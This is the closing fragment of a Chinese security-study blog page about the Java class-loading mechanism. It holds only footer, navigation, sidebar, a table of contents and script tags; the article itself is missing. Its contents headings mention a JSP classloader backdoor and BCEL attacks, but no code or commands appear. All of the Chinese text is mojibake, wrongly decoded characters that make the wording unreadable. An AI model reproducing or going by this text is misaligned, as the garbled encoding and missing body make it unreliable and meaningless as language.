å®¡è®¡/å®¡è®¡åŸºç¡€/Javaç±»åŠ è½½æœºåˆ¶/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="10. JaveEEæ ¸å¿ƒ"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> Javaå®‰å…¨åŸºç¡€</span><h3>10. JaveEEæ ¸å¿ƒ</h3></a></div><div class="item right"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyhsblkj20zk0m81kx.jpg" title="3. sun.misc.Unsafe"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> Javaå®‰å…¨åŸºç¡€</span><h3>3. sun.misc.Unsafe</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">ç±»åŠ è½½æœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">ç±»åŠ è½½å™¨çš„ç§ç±»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bootstarp-classloader"><span class="toc-number">1.1.1.</span> <span class="toc-text">Bootstarp ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extension-classloader"><span class="toc-number">1.1.2.</span> <span class="toc-text">Extension ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#application-classloader"><span class="toc-number">1.1.3.</span> <span class="toc-text">Application ClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-classloader"><span class="toc-number">1.1.4.</span> <span class="toc-text">User ClassLoader</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%89%98%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">åŒäº²å§”æ‰˜æœºåˆ¶</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">ClassLoaderï¼ˆç±»åŠ è½½æœºåˆ¶ï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">Java ç±»</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#classloader"><span class="toc-number">4.</span> <span class="toc-text">ClassLoader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java-%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">Java ç±»åŠ¨æ€åŠ è½½æ–¹å¼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#classloader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">ClassLoader ç±»åŠ è½½æµç¨‹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89-classloader"><span class="toc-number">7.</span> <span class="toc-text">è‡ªå®šä¹‰ ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#loadclass"><span class="toc-number">7.0.1.</span> <span class="toc-text">loadClass()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">7.0.2.</span> <span class="toc-text">è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#urlclassloader"><span class="toc-number">8.</span> <span class="toc-text">URLClassLoader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%9A%94%E7%A6%BB"><span class="toc-number">9.</span> <span class="toc-text">ç±»åŠ è½½éš”ç¦»</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD"><span class="toc-number">9.1.</span> <span class="toc-text">è·¨ç±»åŠ è½½å™¨åŠ è½½</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jsp-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%90%8E%E9%97%A8"><span class="toc-number">10.</span> <span class="toc-text">JSP è‡ªå®šä¹‰ç±»åŠ è½½åé—¨</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bcel-classloader"><span class="toc-number">11.</span> <span class="toc-text">BCEL ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bcel-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">11.1.</span> <span class="toc-text">BCEL æ”»å‡»åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bcel-%E7%BC%96%E8%A7%A3%E7%A0%81"><span class="toc-number">11.2.</span> <span class="toc-text">BCEL ç¼–è§£ç </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xalan-classloader"><span class="toc-number">12.</span> <span class="toc-text">Xalan ClassLoader</span></a></li></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/" rel="bookmark" title="ideaåŸºç¡€ä½¿ç”¨">ideaåŸºç¡€ä½¿ç”¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="bookmark" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" rel="bookmark" title="ç±»åŠ¨æ€åŠ è½½">ç±»åŠ¨æ€åŠ è½½</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Javaåå°„">Javaåå°„</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="bookmark" title="10. JaveEEæ ¸å¿ƒ">10. JaveEEæ ¸å¿ƒ</a></li><li class="active"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="bookmark" title="1. javaç±»åŠ è½½æœºåˆ¶">1. javaç±»åŠ è½½æœºåˆ¶</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="bookmark" title="3. sun.misc.Unsafe">3. sun.misc.Unsafe</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="bookmark" title="4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨">4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="bookmark" title="6. JDBC">6. JDBC</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ä½™æ˜Ÿé…’" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ä½™æ˜Ÿé…’</p><div class="description" itemprop="description">æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">190</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">38</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">30</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/Other/%E5%85%B6%E4%BD%99%E6%8C%87%E4%BB%A4/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº åŸºç¡€">åŸºç¡€</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/NGFW/%E9%98%B2%E7%81%AB%E5%A2%99%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7/" title="é˜²ç«å¢™é«˜å¯é æ€§">é˜²ç«å¢™é«˜å¯é æ€§</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº åŸºç¡€">åŸºç¡€</a></div><span><a href="/Program/golang/%E5%85%A5%E9%97%A8/%E5%8F%98%E9%87%8F%E5%92%8C%E5%B8%B8%E9%87%8F/" title="å˜é‡å’Œå¸¸é‡">å˜é‡å’Œå¸¸é‡</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%B8%B8%E7%94%A8%E5%BA%93/" title="åˆ†ç±»äº å¸¸ç”¨åº“">å¸¸ç”¨åº“</a></div><span><a href="/Program/golang/%E5%B8%B8%E7%94%A8%E5%BA%93/runtime/" title="runetime">runetime</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="åˆ†ç±»äº ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="5. javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ">5. javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº åŸºç¡€">åŸºç¡€</a></div><span><a href="/Program/golang/%E5%85%A5%E9%97%A8/Go%E5%91%BD%E4%BB%A4/" title="Goå‘½ä»¤">Goå‘½ä»¤</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/AC/%E4%B8%8A%E7%BD%91%E7%AE%A1%E6%8E%A7/" title="ä¸Šç½‘ç®¡æ§">ä¸Šç½‘ç®¡æ§</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/System/" title="åˆ†ç±»äº æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</a> <i class="ic i-angle-right"></i> <a href="/categories/System/centos/" title="åˆ†ç±»äº centos">centos</a></div><span><a href="/System/centos/Linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%9C%8D%E5%8A%A1/" title="Linuxæ–‡ä»¶ä¼ è¾“æœåŠ¡">Linuxæ–‡ä»¶ä¼ è¾“æœåŠ¡</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E8%BF%9B%E9%98%B6/" title="åˆ†ç±»äº è¿›é˜¶">è¿›é˜¶</a></div><span><a href="/Program/golang/%E8%BF%9B%E9%98%B6/%E6%8E%A5%E5%8F%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/" title="æ¥å£ä¸åå°„">æ¥å£ä¸åå°„</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/AC/" title="åˆ†ç±»äº AC">AC</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E7%BB%88%E7%AB%AF%E8%AF%86%E5%88%AB/" title="ç»ˆç«¯è¯†åˆ«">ç»ˆç«¯è¯†åˆ«</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 â€“ <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ä½™æ˜Ÿé…’ @ ä½™æ˜Ÿé…’</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/å®¡è®¡åŸºç¡€/Javaç±»åŠ è½½æœºåˆ¶/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",hide:"(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->